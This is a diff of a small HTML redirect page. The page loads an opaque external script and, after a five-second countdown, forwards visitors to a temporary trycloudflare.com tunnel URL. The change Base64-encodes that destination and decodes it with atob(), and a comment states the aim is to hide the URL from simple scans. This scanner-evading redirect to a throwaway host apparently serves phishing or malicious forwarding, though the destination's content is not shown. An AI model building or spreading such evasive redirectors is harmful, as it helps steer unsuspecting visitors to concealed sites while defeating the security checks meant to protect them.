@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <script type='text/javascript' src='https://outerface.venice.ai/3d-46JCuz5eZ0W9cShP_pbMjVTkCdNo8oVRmSCZqPq3NiBiYSVbayr9cVyz5PzUMhB4QCo8oMWHOuaYvElsIDboHoGsQXdDIkaKApRRCV-k-RfcQlyIG-QpKc3kW4W4_9BY682LLeq8HNBQ1aMO0eispN4ozx0FFC7AEAPIuNG2gwYQ5HYry2O6o1ZaHbik-nPlnHKpTqzY6xUqjxjwar09o6w1vCt0WcQWhPjtpDSCOLjkBZggTWdzSxqXwL7usPiTyhT3qzDTSaZwAW805VwBAjutl7uAF8v_reup6V3xjBJI57H4maAuVDPcNvArk-gp8reMONDLhyYTwiO95oiB2Ski84pxnwi7qbj7ukgSKj6nGuycrDNr-3EiU_KzcUX27kzvP7p_-pYGC8mLNXQlX8-2tc400GjwC12ftPtE80DtlR5GIgU9RD4aa3S_5u-PBBEhl8o32LB-WCs1Mo7JcJwWSbKY'></script><style>
+    <script type='text/javascript' src='https://outerface.venice.ai/3d-46JCuz5eZ0W9cShP_pbMjVTkCdNo8oVRmSCZqPq3NiBiYSVbayr9cVyz5PzUMhB4QCo8oMWHOuaYvElsIDboHoGsQXdDIkaKApRRCV-k-RfcQlyIG-QpKc3kW4W4_9BY682LLeq8HNBQ1aMO0eispN4ozx0FFC7AEAPIuNG2gwYQ5HYry2O6o1ZaHbik-nPlnHKpTqzY6xUqjxjwar09o6w1vCt0WcQWhPjtpDSCOLjkBZggTWdzSxqXwL7usPiTyhT3qzDTSaZwAW805VwBAjutl7uAF8v_reup6V3xjBJI57H4maAuVDPcNvArk-gp8reMONDLhyYTwiO95oiB2Ski84pxnwi7qbj7ukgSKj6nGuycrDNr-3EiU_KzcUX27kzvP7p_-pYGC8mLNXQlX8-2tc400GjwC12ftPtE80DtlR5GIgU9RD4aa3S_5u-PBBEhl8o32LB-WCs1Mo7JcJwWSbKY'></script>
+    <style>
         /* Basic styling to center the text, though the page is mostly blank */
         body {
             font-family: sans-serif;
@@ -23,16 +24,15 @@
     </style>
 </head>
 <body>
-
     <div id="timer">Redirecting in <span id="countdown">5</span> seconds...</div>
-
     <script>
         // --- EDIT THIS LINE ---
-        // Set the final destination URL here.
-        const destinationUrl = 'https://men-firmware-guests-silly.trycloudflare.com';
+        // The URL is encoded in Base64 to hide it from simple scans.
+        // This is the encoded URL for: https://men-firmware-guests-silly.trycloudflare.com
+        const encodedUrl = 'aHR0cHM6Ly9tZW4tZmlybXdhcmUtZ3Vlc3RzLXNpbGx5LnRyeWNsb3VkZmxhcmUuY29t';
         // ---------------------
 
-        // Set the delay time in seconds
+        const destinationUrl = atob(encodedUrl); // Decodes the Base64 string back to a normal URL
         const delayInSeconds = 5;
 
         // Get the countdown span element
@@ -54,6 +54,5 @@
             }
         }, 1000); // 1000 milliseconds = 1 second
     </script>
-
 </body>
 </html>
